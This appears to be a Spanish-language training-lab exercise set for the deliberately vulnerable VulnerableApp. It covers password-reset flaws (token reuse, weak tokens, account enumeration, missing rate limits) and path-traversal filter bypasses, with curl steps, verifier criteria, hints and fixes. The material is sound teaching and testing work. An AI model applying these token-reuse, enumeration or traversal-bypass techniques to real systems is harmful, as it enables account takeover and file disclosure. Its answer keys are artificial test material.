Crear el token mediante el flujo normal: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_1 -H 'Content-Type: application/json' -H 'Accept: application/json' --data '{"action":"request","email":"level1_user1@sasanlabs.org"}'

Aplicar una primera contraseña de laboratorio usando el patrón esperado: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_1 -H 'Content-Type: application/json' --data '{"action":"reset","token":"reset-1","newPassword":"VA_LAB_LEVEL1_A"}'

Repetir con otra contraseña inocua para verificar la reutilización: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_1 -H 'Content-Type: application/json' --data '{"action":"reset","token":"reset-1","newPassword":"VA_LAB_LEVEL1_B"}'

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Password reset successful"
}
```

**Pistas:**

El id del primer usuario de level 1 es 1 porque el seeder calcula ((1-1)*3)+1.

El método GET con cuerpo ausente devuelve page ready; las acciones se enrutan por POST JSON.

Un segundo 200 no es una prueba genérica de seguridad: aquí debe correlacionarse con el mensaje JSON y con la regla de código sobre used/expiry.

**Corrección recomendada:** Usar un generador criptográficamente aleatorio con suficiente entropía, almacenar sólo un hash del token si procede, imponer expiración corta, invalidarlo atómicamente tras el primer uso y aplicar respuestas uniformes.

### passwordReset-02 · Nivel 2: token sin expiración y formato débil

El servicio debería enviar un enlace cuyo token tiene la forma weak-<entero de 1000 a 9999>, guardar expiresAt=null y aceptar el mismo token una segunda vez. La ausencia de expiración se verifica por código; para comprobarla de manera dinámica hay que reutilizar el token después del TTL normal, sin prometer de antemano el resultado del entorno.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El token debe obtenerse del correo de la propia cuenta del laboratorio. No se fuerza una espera artificial ni se envían peticiones masivas: la parte de expiración se deja como verificación manual y la parte estructural queda sustentada por PasswordResetService.

Verificar la redirección de página con un parámetro benigno: curl -i --get http://target:9090/VulnerableApp/PasswordResetVulnerability/Level2 --data-urlencode 'token=VA_LAB_LEVEL2'

Solicitar el reset a la cuenta sembrada: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_2 -H 'Content-Type: application/json' --data '{"action":"request","email":"level2_user1@sasanlabs.org"}'

Abrir Mailpit en http://mailpit:8025/mailpit, seleccionar el correo de la cuenta y copiar sólo el token del enlace; no copiar credenciales ni otros mensajes.

Usar el token copiado una vez: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_2 -H 'Content-Type: application/json' --data '{"action":"reset","token":"TOKEN_COPIADO_DE_MAILPIT","newPassword":"VA_LAB_LEVEL2_A"}'

Tras el periodo que el flujo seguro debería considerar expirado, repetir una sola vez con VA_LAB_LEVEL2_B y registrar si el servidor aún acepta el token; no generar más solicitudes que las necesarias.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Inspeccionar Mailpit y luego comparar el comportamiento del mismo token antes y después del periodo de expiración; anotar que el código predice expiresAt=null y reutilización."
}
```

**Pistas:**

El payload del repositorio describe ausencia de expiración, pero la comprobación más directa es expiresAt=null en computeExpiry.

No confundas el mensaje visual de Mailpit con una garantía: el dato decisivo es la respuesta JSON de reset.

El endpoint GET no consume action/email desde query; para la acción usa POST y Content-Type application/json.

**Corrección recomendada:** Generar tokens con SecureRandom, no usar rangos pequeños, guardar una expiración obligatoria del lado servidor y marcar used de forma transaccional antes de permitir un segundo cambio.

### passwordReset-03 · Nivel 3: distinguir uso único de ausencia de expiración

El primer reset debería ser válido y marcar el token como usado; el segundo debería responder con content=Invalid or expired reset token. El código además deja expiresAt=null en level 3, así que la edad del token no sustituye al control de uso único.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Este control negativo/positivo separa dos propiedades que a menudo se mezclan: el token no caduca por edad en el código, pero sí se invalida después de su primer uso. El cambio se hace sobre el usuario de nivel 3 del laboratorio.

Solicitar un token: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_3 -H 'Content-Type: application/json' --data '{"action":"request","email":"level3_user1@sasanlabs.org"}'

Consultar Mailpit en http://mailpit:8025/mailpit y copiar el token del enlace de level3_user1@sasanlabs.org.

Primer uso: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_3 -H 'Content-Type: application/json' --data '{"action":"reset","token":"TOKEN_COPIADO_DE_MAILPIT","newPassword":"VA_LAB_LEVEL3_A"}'

Segundo uso controlado: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_3 -H 'Content-Type: application/json' --data '{"action":"reset","token":"TOKEN_COPIADO_DE_MAILPIT","newPassword":"VA_LAB_LEVEL3_B"}'

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Invalid or expired reset token"
}
```

**Pistas:**

El test del repositorio espera que token.isUsed sea true tras el primer reset.

No uses un token de otro nivel: la consulta incluye token y level.

El segundo intento debe evaluarse por $.content, no sólo por el código HTTP.

**Corrección recomendada:** Mantener expiración corta incluso en tokens de un solo uso y realizar la comprobación y la transición used=false a used=true bajo bloqueo/transacción, de forma que solicitudes concurrentes no reutilicen el mismo token.

### passwordReset-04 · Nivel 4: enumeración por diferencia de respuesta

Para el correo sembrado se espera el mensaje genérico y envío de correo; para el correo inexistente el código devuelve la cadena No account found for email: not-a-user@example.invalid con isValid=false. La diferencia de contenido, no un simple 200, es la señal documentada.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

La comparación usa una dirección conocida de la base de datos de entrenamiento y una dirección reservada .invalid. No se prueban contraseñas ni se toca otra cuenta. Debe conservarse la igualdad de nivel para que el resultado sea atribuible al flujo de enumeración.

Control positivo, cuenta sembrada: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_4 -H 'Content-Type: application/json' --data '{"action":"request","email":"level4_user1@sasanlabs.org"}'

Caso inexistente: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_4 -H 'Content-Type: application/json' --data '{"action":"request","email":"not-a-user@example.invalid"}'

Control negativo de diseño uniforme en level 9: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_9 -H 'Content-Type: application/json' --data '{"action":"request","email":"not-a-user@example.invalid"}'

Comparar $.content, $.isValid y, si se registra, la ausencia/presencia de correo en Mailpit; no clasificar por el código HTTP aislado.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "No account found for email: not-a-user@example.invalid"
}
```

**Pistas:**

PasswordResetServiceTest espera exactamente la cadena de cuenta desconocida para level 4.

En level 9 el caso desconocido devuelve un objeto con message genérico, level y email, y no envía correo.

Un 200 no prueba IDOR: este ejercicio sólo comprueba diferencia de mensajes de reset y no acceso a recursos de otra identidad.

**Corrección recomendada:** Responder igual para cuentas existentes e inexistentes, con estado lógico uniforme, tiempos razonablemente uniformes y sin confirmar el envío a un destinatario concreto. Registrar el evento del lado servidor sin exponerlo al cliente.

### passwordReset-05 · Nivel 5: inspección segura del enlace enviado

El código construye un enlace con /VulnerableApp/password-reset/reset.html?level=5&token=... y la prueba de payload espera que el esquema sea http. La verificación válida es inspeccionar el enlace recibido en Mailpit; el status JSON de la solicitud no demuestra el esquema.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El correo se envía a la cuenta sembrada y se revisa en el Mailpit aislado. La anotación de nivel 5 denomina el riesgo de enlace inseguro, pero buildResetLink comparte implementación entre niveles; por eso el ejercicio separa expectativa del payload y evidencia efectiva de configuración.

Solicitar el enlace: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_5 -H 'Content-Type: application/json' --data '{"action":"request","email":"level5_user1@sasanlabs.org"}'

Abrir únicamente el buzón de laboratorio en http://mailpit:8025/mailpit y localizar el mensaje VulnerableApp password reset; copiar el href sólo para inspección, sin abrirlo en un navegador con datos personales.

Verificar que el href contiene level=5 y token=, y anotar si comienza por http:// o https://.

Contrastar, si se desea, el mismo procedimiento con level 10; la comparación es de configuración/URL real, no de la etiqueta del nivel.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "En Mailpit, comprobar el esquema real del href, su nivel y que el token está URL-encoded; no marcar el hallazgo sólo porque la solicitud devuelve 200."
}
```

**Pistas:**

El método adjustSchemeForLevel sólo añade http:// si la base no empieza por http:// o https://; no convierte explícitamente https a http según el nivel.

El mensaje de respuesta puede ser genérico aunque el correo no se haya observado.

No expongas el token copiado en logs compartidos ni lo envíes a un host externo.

**Corrección recomendada:** Generar siempre enlaces HTTPS con un host permitido y configuración no manipulable por el cliente, activar HSTS donde corresponda, evitar incluir secretos en URLs cuando sea viable y aplicar expiración/uso único.

### passwordReset-06 · Nivel 6: resolver la discrepancia del generador de token

La revisión del método generateToken predice UUID.randomUUID() para level 6, junto con expiración y uso único. Esto contradice el @AttackVector WEAK_RANDOM_NUMBER_GENERATION y el payload de seis dígitos; el resultado de despliegue debe dejarse como incertidumbre si el binario no coincide con el commit.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El ejercicio es deliberadamente de reconciliación entre fuente, anotación, payload y runtime. Sólo solicita un correo de la cuenta de nivel 6 y no realiza fuerza bruta ni intentos de adivinación.

Solicitar un reset controlado: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_6 -H 'Content-Type: application/json' --data '{"action":"request","email":"level6_user1@sasanlabs.org"}'

Abrir http://mailpit:8025/mailpit y observar el token del enlace sin probar valores alternativos.

Comparar manualmente el formato observado con UUID.randomUUID() y registrar por separado la discrepancia con PasswordResetVulnerabilityPayload.properties.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Comparar el token del href de Mailpit con la rama ejecutable del commit; no declarar débil un token sólo por el texto del payload ni declarar corregido el nivel sin comprobar el artefacto desplegado."
}
```

**Pistas:**

isWeakRandomTokenVulnerable devuelve true sólo cuando level >= 2 && level <= 5.

La rama level == 8 se evalúa antes y no afecta a level 6.

Una etiqueta de AttackVector no sustituye la lectura de la rama que realmente se ejecuta.

**Corrección recomendada:** Mantener SecureRandom para tokens y actualizar anotaciones/payloads cuando cambie la implementación, además de pruebas de integración que fijen el formato y propiedades de expiración/uso único.

### passwordReset-07 · Nivel 7: comprobar la política de Referer sin ejecutar JavaScript

Para level=7, el filtro debería añadir Referrer-Policy: unsafe-url a la respuesta de reset.html. La llamada curl no prueba que la imagen de terceros haya recibido el token; sólo comprueba la condición de política. Como control negativo, level=6 en la misma página no debería activar ese encabezado por este filtro.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El token usado es un marcador inocuo y no procede de Mailpit. El código de reset.js carga una URL fija de dummyimage.com sólo en nivel 7; no se introduce una URL controlada por el alumno ni se realiza SSRF. La parte de fuga efectiva se reserva a una revisión manual de Network en un navegador aislado.

Control positivo de cabecera: curl -i --get http://target:9090/VulnerableApp/password-reset/reset.html --data-urlencode 'level=7' --data-urlencode 'token=VA_LAB_TRAINING_TOKEN'

Control negativo del filtro: curl -i --get http://target:9090/VulnerableApp/password-reset/reset.html --data-urlencode 'level=6' --data-urlencode 'token=VA_LAB_TRAINING_TOKEN'

Revisar sólo los headers y el HTML recibido; curl no ejecuta reset.js y por ello no atribuir una recepción al tercero.

Si se hace una revisión manual, usar un navegador aislado y un token marcador; observar la solicitud de imagen en Network y no hacer click como criterio de puntuación.

Registrar la misma prueba con el cliente del laboratorio:
lab request passwordReset-07 --method GET --param level=7 --param token=VA_LAB_TRAINING_TOKEN --header Accept=text/html

**Criterio del verificador:**

```json
{
  "kind": "header",
  "value": "unsafe-url",
  "header": "Referrer-Policy"
}
```

**Pistas:**

PasswordResetReferrerPolicyFilter comprueba que la URI termina en /password-reset/reset.html y que Integer.parseInt(level)==7.

El header positivo prueba una política permisiva, no por sí mismo la exfiltración efectiva.

Un reflejo de un valor en HTML tampoco probaría ejecución XSS; aquí no se está probando XSS.

**Corrección recomendada:** No poner tokens en URLs si no es necesario, usar una Referrer-Policy restrictiva como no-referrer o strict-origin-when-cross-origin según el caso, eliminar recursos de terceros del flujo sensible y hacer que el token sea corto, aleatorio, expirado y de un solo uso.

### passwordReset-08 · Nivel 8: token Base64 que sólo oculta id y tiempo

La implementación usa Base64 URL-safe de obf:<id>:<epochSeconds> y, según el código, sí aplica cinco minutos de expiración y uso único. El ejercicio debe registrar ambas cosas por separado y no repetir la afirmación del payload de ausencia de expiración/reutilización sin evidencia del binario.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Se usa una cuenta seeded de nivel 8 y un único correo. La revisión del token se limita a su formato y no intenta adivinar ventanas de tiempo ni cambiar contraseñas de usuarios ajenos.

Solicitar el enlace: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_8 -H 'Content-Type: application/json' --data '{"action":"request","email":"level8_user1@sasanlabs.org"}'

Abrir http://mailpit:8025/mailpit y copiar el token sólo para inspección local.

Registrar que el formato esperado por código es una codificación Base64 URL-safe de obf:<id>:<epochSeconds>; no considerarlo aleatorio sólo porque no sea legible a simple vista.

Usar, si se necesita comprobar el flujo, una sola solicitud reset con una contraseña VA_LAB_LEVEL8 y después observar que el código debería rechazar un segundo uso; no atribuir al payload propiedades que contradice la rama actual.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Inspeccionar el enlace de Mailpit y contrastar su token con la fórmula de generateObscuredWeakToken; documentar por separado la expiración y el uso único observables por código."
}
```

**Pistas:**

La rama level == 8 se ejecuta antes de la prueba de weakRandom.

El payload dice missing expiry/reuse, pero los predicados del servicio no incluyen level 8 en esas dos vulnerabilidades.

Codificación Base64 no es una medida de aleatoriedad ni de confidencialidad.

**Corrección recomendada:** Sustituir construcciones derivadas de identificadores/tiempo por bytes criptográficamente aleatorios, no confundir codificación con cifrado y conservar expiración estricta y uso único.

### passwordReset-09 · Nivel 9 frente a nivel 10: control de rate limiting

Para el mismo correo reservado .invalid, la revisión del código predice seis respuestas de flujo normal en level 9 y cinco respuestas normales seguidas de requestBlocked=true en la sexta llamada de level 10 dentro de la ventana de 30 minutos. El ejercicio usa una dirección inexistente para evitar enviar correo y sólo seis solicitudes explícitas por nivel.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Esto contrasta el negativo vulnerable (level 9 no llama al contador) con el positivo seguro (level 10 sí lo llama). No se usa concurrencia, bucle masivo, fuerza bruta ni una cuenta real. Como el contador vive en memoria, un proceso reiniciado o un entorno compartido puede cambiar el resultado.

Control vulnerable, llamada 1: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_9 -H 'Content-Type: application/json' --data '{"action":"request","email":"va-rate-test@example.invalid"}'

Control vulnerable, llamada 2: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_9 -H 'Content-Type: application/json' --data '{"action":"request","email":"va-rate-test@example.invalid"}'

Control vulnerable, llamada 3: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_9 -H 'Content-Type: application/json' --data '{"action":"request","email":"va-rate-test@example.invalid"}'

Control vulnerable, llamada 4: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_9 -H 'Content-Type: application/json' --data '{"action":"request","email":"va-rate-test@example.invalid"}'

Control vulnerable, llamada 5: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_9 -H 'Content-Type: application/json' --data '{"action":"request","email":"va-rate-test@example.invalid"}'

Control vulnerable, llamada 6: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_9 -H 'Content-Type: application/json' --data '{"action":"request","email":"va-rate-test@example.invalid"}'

Repetir sólo seis llamadas con el mismo correo reservado en LEVEL_10, cambiando únicamente la ruta. La sexta es la que se contrasta con $.content.requestBlocked y $.content.rateLimitingApplied.

No sumar llamadas adicionales ni paralelizarlas; la finalidad es una comparación de control, no una prueba de carga.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "true"
}
```

**Pistas:**

isRateLimitingEnabled devuelve true sólo para level==10.

El contador consume el cupo antes de consultar al repositorio, por lo que una cuenta .invalid también alcanza el bloqueo de la sexta llamada.

Un HTTP 200 no prueba que no exista abuso: inspecciona el JSON y documenta el estado inicial del proceso.

**Corrección recomendada:** Aplicar rate limiting por cuenta/identidad y origen con almacenamiento compartido y ventana bien definida, mantener respuesta genérica y monitorizar abuso sin convertir el control en un DoS contra cuentas legítimas.

### passwordReset-10 · Flujo seguro de aplicación del reset en nivel 10

El código predice SecureRandom de 24 bytes, expiración de cinco minutos, uso único y bloqueo de la sexta solicitud por email. La solicitud y el primer reset deberían ser válidos si el correo y token se corresponden; un segundo reset con el mismo token debería devolver Invalid or expired reset token. No se afirma ningún resultado runtime sin ejecutar el laboratorio.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El objetivo es usar la variante secure como control frente a los niveles vulnerables, no obtener secretos. La contraseña es un marcador de entrenamiento y el usuario es uno de los tres que el seeder creó para el nivel 10.

Solicitar el correo de nivel 10: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_10 -H 'Content-Type: application/json' --data '{"action":"request","email":"level10_user1@sasanlabs.org"}'

Abrir http://mailpit:8025/mailpit y copiar el token del enlace de level10_user1@sasanlabs.org sin publicar el enlace.

Primer reset de laboratorio: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_10 -H 'Content-Type: application/json' --data '{"action":"reset","token":"TOKEN_COPIADO_DE_MAILPIT","newPassword":"VA_LAB_LEVEL10_A"}'

Segundo uso del mismo token: curl -sS -i -X POST http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_10 -H 'Content-Type: application/json' --data '{"action":"reset","token":"TOKEN_COPIADO_DE_MAILPIT","newPassword":"VA_LAB_LEVEL10_B"}'

Para el rate limit, usar el ejercicio comparativo con va-rate-test@example.invalid y no mezclar el contador de ese correo con otras pruebas.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Invalid or expired reset token"
}
```

**Pistas:**

La prueba del repositorio level9ShouldEnforceSingleUseAndExpiry representa la expectativa para el flujo seguro.

La respuesta exitosa muestra username, pero eso no convierte la API en una prueba de IDOR ni autoriza a cambiar otra identidad.

La ausencia de un click o de una interfaz visual no debe recibir puntaje: el criterio es la respuesta JSON y la propiedad del código que se está comprobando.

**Corrección recomendada:** Conservar tokens de alta entropía, expiración y uso único, hacer el rate limiting compartido y resistente a reinicios, y devolver mensajes genéricos que no enumeren cuentas.

### Límites de esta familia

{
  "scope": "La revisión se limitó a src/main/java/org/sasanlabs/service/vulnerability/passwordReset, sus anotaciones de enrutamiento, el filtro de Referer, los recursos PasswordReset relacionados, el payload específico y los dos tests específicos. No se investigaron otras familias de vulnerabilidades.",
  "runtime": "No se afirma que los comandos hayan sido ejecutados contra target. El resultado es verificación estática del commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a y un plan reproducible para el laboratorio Docker indicado. El estado de la base, Mailpit, configuración de EmailConfiguration, proceso y cachés puede cambiar los resultados observados.",
  "route_semantics": "Las diez rutas primarias son /VulnerableApp/PasswordResetVulnerability/LEVEL_1 hasta /LEVEL_10. Además, el controlador admite POST en esas rutas mediante LEVEL_{level}, y un alias GET /VulnerableApp/PasswordResetVulnerability/Level{n} que redirige a la UI central y conserva token como query parameter. La página estática dedicada es /VulnerableApp/password-reset/reset.html?level=n&token=...; el test específico confirma ese prefijo de enlace.",
  "code_payload_mismatches": [
    "Level 6 está anotado como WEAK_RANDOM_NUMBER_GENERATION y el payload habla de seis dígitos, pero generateToken usa UUID.randomUUID() porque la función de token débil sólo cubre niveles 2..5.",
    "Level 8 está descrito por el payload como combinación de ausencia de expiración y reutilización, pero los predicados actuales aplican expiración y uso único a level 8; su debilidad ejecutable es el valor Base64 de obf:<id>:<epochSeconds>.",
    "Level 5 denomina el enlace HTTP como debilidad, pero buildResetLink usa EmailConfiguration para todos los niveles y sólo añade http:// si falta esquema; el href efectivo debe verificarse en Mailpit."
  ],
  "honest_verifier": "Un reflejo de una cadena en HTML no prueba ejecución XSS; por eso no se usa un reflejo como criterio aquí. Un HTTP 200 no prueba IDOR, autorización ni aceptación de un token: hay que validar content/isValid, la identidad y el estado de used/expiry. No se debe atribuir puntaje por hacer click, por ver una página, por un correo visual o por una redirección aislada. Para level 7, un header unsafe-url prueba una política permisiva, no que un tercero haya recibido efectivamente el token; para rate limiting hay que observar requestBlocked y conocer el estado del contador.",
  "safe_boundaries": "Los marcadores de contraseña son VA_LAB_LEVELn_A/B. No se incluyen comandos externos, shells, fuerza bruta, lectura de secretos del host, borrado, DoS, SSRF ni RFI. El receptor http://receiver:8081 no se usa porque esta familia no acepta un destino de red configurable; el único recurso tercero de level 7 está hardcodeado en dummyimage.com y se deja sin invocación activa en los pasos curl."
}

## Recorrido de rutas y controles de archivos

La clase PathTraversalVulnerability expone 15 endpoints GET bajo /VulnerableApp/PathTraversal/LEVEL_N. Cada método obtiene el parámetro de consulta fileName y lo concatena a /scripts/PathTraversal/ para llamar a Class.getResourceAsStream. readFile devuelve HTTP 200 tanto si encuentra un recurso como si lo rechaza o no lo encuentra: en el primer caso el JSON tiene isValid=true y content con el recurso (sin saltos de línea), y en el segundo isValid=false y content=null. Los niveles 1 a 12 llevan la variante UNSECURE por defecto y ensayan filtros incompletos (listas negras aplicadas a la URL cruda, codificación de puntos/barras y truncamiento en byte NUL); los niveles 13 a 15 llevan Variant.SECURE y muestran, respectivamente, lista blanca exacta, normalización léxica dentro del directorio base y una expresión regular de nombres seguros. El prefijo público se obtiene del nombre de la clase anotada (PathTraversal) y del nivel de @VulnerableAppRequestMapping; el proveedor central concatena appUrl + nombre + / + nivel. La fuente de datos inocua documentada aquí es /tmp/va-training.txt con el marcador VA_LAB_FILE si la imagen de laboratorio la ha creado y el classloader del despliegue permite resolverla; no se usan /etc/passwd, secretos del host, comandos ni payloads destructivos.

### Todos los niveles originales

#### `GET /VulnerableApp/PathTraversal/LEVEL_1`

**Entrada:** {
  "query": [
    "fileName"
  ],
  "type": "String"
}

Si fileName no es null, lo concatena directamente a /scripts/PathTraversal/ y entrega el recurso que el classloader pueda resolver. No hay validación de ruta.

@AttackVector describe inyección directa en el parámetro URL y la anotación no establece Variant.SECURE. El test también comprueba que ../ produce una respuesta válida en la implementación del commit, aunque el contenido exacto depende del classloader. UserInfo.json y OwaspAppInfo.json son controles positivos seguros.

#### `GET /VulnerableApp/PathTraversal/LEVEL_2`

**Entrada:** {
  "query": [
    "fileName"
  ],
  "type": "String"
}

Recibe RequestEntity y rechaza solamente si requestEntity.getUrl().toString() contiene la secuencia literal ../; después usa fileName sin normalizar.

Una representación codificada de puntos y barras puede no contener ../ en la URL cruda aunque el parámetro decodificado sí lo contenga. El resultado real debe confirmarse con el JSON y el marcador, no con el 200.

#### `GET /VulnerableApp/PathTraversal/LEVEL_3`

**Entrada:** {
  "query": [
    "fileName"
  ],
  "type": "String"
}

Rechaza solo la secuencia literal .. en la representación textual de la URL; fileName se emplea directamente al resolver el recurso.

El filtro es más amplio que LEVEL_2 solo para texto literal, pero sigue inspeccionando la URL cruda y no la ruta normalizada. La codificación de cada punto es la variante relevante del laboratorio.

#### `GET /VulnerableApp/PathTraversal/LEVEL_4`

**Entrada:** {
  "query": [
    "fileName"
  ],
  "type": "String"
}

Rechaza .. literal y la secuencia minúscula %2f en la URL; no hace la comprobación de barra codificada de forma insensible a mayúsculas.

Una barra codificada como %2F puede evitar el segundo chequeo textual, mientras el framework entrega al parámetro la ruta decodificada. La diferencia entre URL cruda y parámetro decodificado es una incertidumbre dependiente del contenedor.

#### `GET /VulnerableApp/PathTraversal/LEVEL_5`

**Entrada:** {
  "query": [
    "fileName"
  ],
  "type": "String"
}

Rechaza .. literal y comprueba %2f después de toLowerCase(); continúa usando fileName sin una resolución segura dentro de la base.

Corrige el caso de mayúsculas de %2F, pero todavía inspecciona la URL en vez de validar una ruta normalizada. Una codificación de los puntos con barras literales es la variante representativa.

#### `GET /VulnerableApp/PathTraversal/LEVEL_6`

**Entrada:** {
  "query": [
    "fileName"
  ],
  "type": "String"
}

Ya no recibe RequestEntity: comprueba fileName después del binding y rechaza si contiene ..; no aplica lista blanca, normalización ni comprobación de que el destino permanezca bajo la base.

El test confirma que el fileName literal .. se rechaza, por lo que un intento directo debe ser un control negativo. La etiqueta original sigue siendo UNSECURE; cualquier bypass adicional depende de cuántas decodificaciones haga el servidor y el classloader, y no se debe afirmar solo por la etiqueta.

#### `GET /VulnerableApp/PathTraversal/LEVEL_7`

**Entrada:** {
  "query": [
    "fileName"
  ],
  "type": "String"
}

Busca uno de los nombres permitidos (UserInfo.json u OwaspAppInfo.json) en el valor original, corta fileName en el primer carácter NUL y resuelve solo la parte anterior al NUL.

El nombre permitido puede quedar después del NUL para satisfacer la condición mientras la parte previa es la ruta candidata. No hay filtro de ../ en la URL. El comentario original muestra precisamente la idea de sufijar UserInfo.json; este informe sustituye el objetivo por /tmp/va-training.txt.

#### `GET /VulnerableApp/PathTraversal/LEVEL_8`

**Entrada:** {
  "query": [
    "fileName"
  ],
  "type": "String"
}

Mantiene el truncamiento NUL y la condición de nombre permitido de LEVEL_7, pero añade un bloqueo de ../ literal en la URL cruda.

El filtro no inspecciona una ruta ya decodificada/normalizada; una representación codificada de puntos y barras es la variante a observar. El test solo cubre el caso URL literal ../ como control negativo.

#### `GET /VulnerableApp/PathTraversal/LEVEL_9`

**Entrada:** {
  "query": [
    "fileName"
  ],
  "type": "String"
}

Mantiene NUL y la lista de nombres de LEVEL_7, y bloquea .. literal en requestEntity.getUrl().toString().

Una codificación de los puntos puede ocultar .. de la comprobación textual de la URL; el parámetro decodificado podría seguir siendo una ruta de traversal. La prueba unitaria verifica el rechazo del texto literal.

#### `GET /VulnerableApp/PathTraversal/LEVEL_10`

**Entrada:** {
  "query": [
    "fileName"
  ],
  "type": "String"
}

Mantiene NUL y la lista de nombres, bloquea .. literal y bloquea %2f minúsculo en la URL cruda.

La barra codificada en mayúsculas y los puntos codificados son la variante de filtro relevante. La descripción del recurso secret.json dice que este nivel y LEVEL_5 exponen ese dummy, pero el ejercicio usa exclusivamente el marcador de laboratorio.

#### `GET /VulnerableApp/PathTraversal/LEVEL_11`

**Entrada:** {
  "query": [
    "fileName"
  ],
  "type": "String"
}

Mantiene NUL y la lista de nombres, bloquea .. y comprueba %2f después de convertir toda la URL a minúsculas.

Cierra el bypass de mayúsculas de %2F, pero todavía usa listas negras sobre la URL cruda. Una ruta con puntos codificados y separadores literales sirve para contrastar el filtro con LEVEL_10; el resultado depende del binding del contenedor.

#### `GET /VulnerableApp/PathTraversal/LEVEL_12`

**Entrada:** {
  "query": [
    "fileName"
  ],
  "type": "String"
}

Mantiene NUL y la lista de nombres, pero aplica fileName.contains("..") sobre el valor ya ligado, sin RequestEntity.

El test confirma que .. literal se rechaza. Añadir el nombre permitido después del NUL no evita por sí mismo el chequeo de ..; este nivel es un buen control negativo para no confundir una condición UNSECURE con un bypass demostrado.

#### `GET /VulnerableApp/PathTraversal/LEVEL_13`

**Entrada:** {
  "query": [
    "fileName"
  ],
  "type": "String"
}

Solo acepta exactamente UserInfo.json u OwaspAppInfo.json mediante ALLOWED_FILE_NAMES.contains(fileName). Los nombres con prefijo de traversal, NUL o cualquier otro texto se rechazan.

Está marcado Variant.SECURE y no tiene @AttackVector. El test cubre null, .., un intento con %00 y el positivo UserInfo.json. Es una lista blanca pequeña, no una lectura arbitraria del directorio.

#### `GET /VulnerableApp/PathTraversal/LEVEL_14`

**Entrada:** {
  "query": [
    "fileName"
  ],
  "type": "String"
}

Construye Paths.get(BASE_RESOURCE_PATH + fileName).normalize() y continúa solo si el objetivo normalizado empieza por la base normalizada; InvalidPathException, incluido un NUL, da false.

Está marcado Variant.SECURE. A diferencia de LEVEL_13 permite cualquier recurso que permanezca léxicamente dentro de /scripts/PathTraversal/, pero bloquea ../secret.json, traversal profundo y NUL según los tests. La comprobación es léxica; no pretende resolver symlinks de un filesystem real.

#### `GET /VulnerableApp/PathTraversal/LEVEL_15`

**Entrada:** {
  "query": [
    "fileName"
  ],
  "type": "String"
}

Solo acepta ^[A-Za-z0-9_-]+\.[A-Za-z0-9]{2,5}$: un nombre, un punto y una extensión corta. Rechaza separadores, .., backslash y NUL antes de leer.

Está marcado Variant.SECURE. El test cubre traversal, NUL y el positivo UserInfo.json. La expresión permite nombres adicionales que cumplan el patrón si existen como recursos, pero no permite construir segmentos de ruta.

### pathTraversal-01 · Control positivo y negativo de un recurso permitido

La primera petición debe devolver HTTP 200 con JSON isValid=true y content que contiene NirraIshq. La segunda, con un nombre inexistente, debe conservar HTTP 200 pero devolver isValid=false y content=null. Esto separa existencia del recurso de código de estado.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

LEVEL_1 no valida fileName. El recurso UserInfo.json es un control positivo conocido en el classpath; does-not-exist.json es un control negativo seguro. No se solicita ningún archivo del host.

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_1 --data-urlencode 'fileName=UserInfo.json'
```

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_1 --data-urlencode 'fileName=does-not-exist.json'
```

Comparar el cuerpo JSON: un 200 no distingue por sí solo el positivo del negativo; revisar isValid y content.

Registrar la misma prueba con el cliente del laboratorio:
lab request pathTraversal-01 --method GET --param fileName=UserInfo.json

**Criterio del verificador:**

```json
{
  "kind": "json",
  "value": true,
  "path": "isValid"
}
```

**Pistas:**

La clave se llama fileName y se envía en la query string.

El bean serializa exactamente las claves content e isValid.

